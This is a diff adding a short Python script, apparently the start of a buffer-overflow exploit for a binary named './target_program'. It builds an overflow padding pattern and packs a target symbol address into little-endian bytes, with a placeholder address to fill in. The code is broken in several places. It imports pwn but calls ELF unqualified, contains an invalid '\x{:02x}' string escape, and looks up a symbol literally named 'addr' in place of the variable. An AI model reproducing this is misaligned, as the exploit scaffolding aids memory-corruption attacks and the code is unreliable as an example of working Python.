@@ -1,0 +1,15 @@
+import struct
+
+import pwn
+
+e = ELF('./target_program')
+
+padd = "AAAAABBBBCCCCDDDDEEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWYYYYXXXXZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyyzzzz1111222233334444555566667777888899990000deadbeefsnowtreerockhailrainfourfive"
+
+addr = 0xdeadbeef #REPLACE WITH ADDRESS, converted in SHELLCODE FUNCTION
+
+sym_addr = e.symbols['addr']
+
+shellcode = ''.join('\x{:02x}'.format(b) for b in struct.pack('<I', sym_addr)) #upper i
+
+print(shellcode)
